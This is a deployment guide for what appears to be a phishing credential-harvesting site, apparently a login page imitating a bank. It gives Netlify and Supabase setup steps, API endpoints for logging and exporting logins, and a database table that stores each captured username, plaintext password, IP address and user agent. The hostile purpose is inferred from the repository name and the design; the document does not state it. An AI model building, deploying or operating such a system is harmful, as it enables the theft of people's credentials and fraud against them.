# Netlify Deployment Guide

This project is configured to deploy on **Netlify** with **Supabase PostgreSQL** backend.

## Architecture

```
Frontend (React) → Netlify (Hosted + Functions) → Supabase (Database)
```

- **Frontend**: Hosted on Netlify static hosting
- **Backend**: Netlify Functions (serverless)
- **Database**: Supabase PostgreSQL

## Deployment Steps

### 1. Connect Your GitHub Repository to Netlify

1. Go to [netlify.com](https://netlify.com)
2. Click "New site from Git"
3. Choose GitHub and select `sapphirenetllc/JPMCLP1`
4. Click "Deploy site"

### 2. Configure Environment Variables

In your Netlify dashboard:

1. Go to **Site settings** → **Build & deploy** → **Environment**
2. Add these environment variables:

| Key | Value |
|-----|-------|
| `SUPABASE_URL` | `https://pgsccgetvjjoerefqitb.supabase.co` |
| `SUPABASE_SERVICE_KEY` | Your Supabase service role key |

### 3. Build Settings (Auto-Detected)

Netlify will auto-detect:
- **Build command**: `npm run build`
- **Publish directory**: `dist`
- **Functions directory**: `netlify/functions`

### 4. Deploy

Click "Deploy site" and wait 1-2 minutes for deployment to complete.

## API Endpoints

Once deployed, your API endpoints will be:

```
Frontend: https://your-site.netlify.app/
API Endpoints:
  POST   https://your-site.netlify.app/api/logs-login
  GET    https://your-site.netlify.app/api/admin-logs
  GET    https://your-site.netlify.app/api/logs-export
  GET    https://your-site.netlify.app/api/health
```

## Local Development

### Option 1: With Netlify Functions Locally

```bash
npm install -g netlify-cli
netlify dev
```

This runs both the frontend and functions locally.

### Option 2: With Traditional Node Backend

```bash
# Terminal 1: Run Netlify dev
netlify dev

# OR Terminal 1: Run frontend dev server
npm run dev

# Terminal 2: Run backend server (optional)
npm run dev:logger
```

## Database

All login attempts are stored in Supabase PostgreSQL `login_logs` table:

- **URL**: https://pgsccgetvjjoerefqitb.supabase.co
- **Table**: `login_logs`
- **Columns**: id, timestamp, username, password, attempt_number, status, user_agent, ip_address, created_at

Access data via:
- Supabase Dashboard: https://supabase.com/dashboard
- API: `GET https://your-site.netlify.app/api/admin-logs`

## Troubleshooting

### Functions not working?

1. Check that `netlify/functions` directory exists
2. Verify `netlify.toml` configuration
3. Check Netlify deploy logs for errors

### API calls failing?

1. Ensure environment variables are set in Netlify
2. Check browser console for CORS errors
3. Verify Supabase connection string is correct

### Local development issues?

```bash
# Clear cache and reinstall
rm -r node_modules package-lock.json
npm install

# Run dev server
npm run dev
```

## Support

For issues:
- Check Netlify build logs
- Verify Supabase database is accessible
- Ensure all environment variables are set correctly
